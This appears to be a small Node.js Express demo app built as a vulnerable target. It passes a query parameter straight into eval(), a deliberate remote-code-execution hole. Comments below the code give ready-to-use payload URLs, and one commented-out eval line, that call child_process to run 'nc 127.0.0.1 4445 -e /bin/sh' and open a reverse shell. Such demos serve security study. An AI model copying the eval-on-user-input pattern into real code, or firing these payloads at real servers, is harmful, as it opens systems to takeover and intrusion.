var express = require('express')
var app = express();
app.get('/', function(req, res) {

 var resp=eval("("+req.query.name+")");
//console.log(resp);
//    var resp=eval("('aaa') && ('aaa') && require(\"child_process\").exec('nc 127.0.0.1 4445 -e /bin/sh')");
  res.send('Response</br>'+resp);
});
app.listen(8000);



//Payload
//http://127.0.0.1:8000/?name=(123%3E%20122)%20|%20require(%22child_process%22).exec(%27nc%20127.0.0.1%204445%20-e%20/bin/sh%27)
//http://127.0.0.1:8000/?name=(123%3E%20124)%20|%20require(%22child_process%22).exec(%27nc%20127.0.0.1%204445%20-e%20/bin/sh%27)
//http://127.0.0.1:8000/?name=require(%22child_process%22).exec(%27nc%20127.0.0.1%204445%20-e%20/bin/sh%27)

